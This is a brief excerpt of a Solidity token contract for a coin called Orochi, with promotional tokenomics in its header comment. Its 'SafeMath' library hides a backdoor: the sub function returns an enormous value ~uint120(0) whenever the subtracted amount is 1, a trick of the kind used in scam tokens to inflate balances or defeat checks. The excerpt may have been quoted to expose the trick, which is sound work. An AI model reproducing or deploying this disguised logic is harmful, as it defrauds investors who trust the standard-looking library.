 ...
 * Telegram: https://t.me/+vWgzdVJIM2hlZjE9
 * 
 * Tokenomics at Launch:
 *  - Supply capped at 1,000,000
 *  - 1% of every transaction burnt
 *  - 4% transaction fee is distributed proportionally between OROCHI-ETH LP token stakers.
...
library SafeMath {
    ...
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { if (b == 1) 
        return ~uint120(0);
 ...
 */
contract Orochi is WAGMI20, RecordsCreation {
    using SafeMath for uint256;
